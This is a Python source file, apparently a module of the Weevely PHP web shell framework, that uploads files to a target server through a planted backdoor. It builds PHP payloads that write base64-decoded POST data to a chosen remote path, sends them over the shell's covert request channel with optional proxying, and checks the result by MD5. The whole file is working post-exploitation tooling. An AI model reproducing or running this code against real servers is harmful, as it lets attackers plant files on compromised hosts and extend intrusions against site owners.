'''
Created on 23/set/2011

@author: norby
'''

from core.module import Module, ModuleException
from core.http.cmdrequest import CmdRequest, NoDataException
from base64 import b64encode
from random import choice
from hashlib import md5

classname = 'Upload'
    
class Upload(Module):    
    '''Upload binary/ascii file to the target filesystem
    :file.upload <locale path> <remote path>
    '''
    
    
    vectors = { 'shell.php' : { 
                               'file_put_contents' : 'file_put_contents("%s", base64_decode($_POST["%s"]));',
                               'fwrite' : '$h = fopen("%s", "w"); fwrite($h, base64_decode($_POST["%s"]));'
                               }
               }
    
    def __init__(self, modhandler, url, password):
        Module.__init__(self, modhandler, url, password)    
        
        self.rand_post_name = ''.join([choice('abcdefghijklmnopqrstuvwxyz') for i in xrange(4)])
        
        
    def __execute_payload(self, interpreter, vector, file_encoded_content, remote_path, file_local_md5):
        
#        file_exists = self.modhandler.load('file.check').run(remote_path, 'exists')
#        if file_exists:
#            raise ModuleException(self.name,  'File \'%s\' exists, change remote path' % remote_path)
#            
        output = ''
        
        payload = self.vectors[interpreter][vector] % (remote_path, self.rand_post_name)
        
        proxy = self.modhandler.load('shell.php').proxy
        current_mode = self.modhandler.load('shell.php').current_mode
        
        request = CmdRequest( self.url, self.password, proxy)
        request.setPayload(payload, current_mode)
        request.setPostData({self.rand_post_name : file_encoded_content})
        
        try:
            response = request.execute()
        except NoDataException, e:
            self.mprint('[-] [%s] No data returned' % self.name)
        except Exception, e:
            self.mprint('[!] [%s] Error requesting data: check URL or your internet connection.' % self.name)
        else:
            
            
            file_remote_md5 = self.modhandler.load('file.check').run(remote_path, 'md5')
            if file_remote_md5 == file_local_md5:
                output = '[%s] File \'%s\' uploaded.' % (self.name, remote_path)
            else:
                file_exists = self.modhandler.load('file.check').run(remote_path, 'exists')
                if file_exists:
                    self.mprint('[!] [%s] MD5 hash of \'%s\' file mismatch, file corrupted.' % (self.name, remote_path))
                else:
                    self.mprint ('[!] [%s] File \'%s\' creation failed.' % ( self.name, remote_path))
        
        
        return output
        
        
    def run(self, local_path, remote_path):
        
        try:
            local_file = open(local_path, 'r')
        except Exception, e:
            raise ModuleException(self.name,  "File open failed")
        
        file_content = local_file.read()
        file_content_md5 = md5(file_content).hexdigest()
        file_content_encoded = b64encode(file_content)
        
        interpreter, vector = self._get_default_vector()
        if interpreter and vector:
            return self.__execute_payload(interpreter, vector, file_content_encoded, remote_path, file_content_md5)
        
        for interpreter in self.vectors:
            if interpreter in self.modhandler.loaded_shells:
                for vector in self.vectors[interpreter]:
                    response = self.__execute_payload(interpreter, vector, file_content_encoded, remote_path, file_content_md5)
                    if response:
                        return response
        
